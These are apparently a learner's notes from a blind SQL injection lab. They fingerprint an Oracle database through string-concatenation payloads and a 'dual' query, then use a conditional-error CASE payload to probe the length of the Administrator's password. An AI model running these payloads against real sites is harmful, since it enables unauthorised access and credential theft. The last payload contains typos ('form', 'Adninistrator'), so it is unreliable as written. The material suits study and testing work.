
---
Oracle : Every `select` has to designate a table

Since we have to check the type of the database to continue our further attack, inject

`' || (select '') ||'`

Internal Server Error occur, this may be due to the database type - try specifying a predictable table name in the query

`' || (select '' from dual) ||'`

we no longer receive the error message, therefore assume the target is probably using Oracle database. 

In Oracle, subquery must return 1 row 1 column, so we must constrain `rownum = 1` in our further statement that check if the database `users` exist.

`' || (select '' from users where rownum = 1) ||'`

Utilize conditional errors : 

`' || (select case when length(password) > num then to_char(1/0) else ' ' end form users where username = 'Adninistrator') || '`
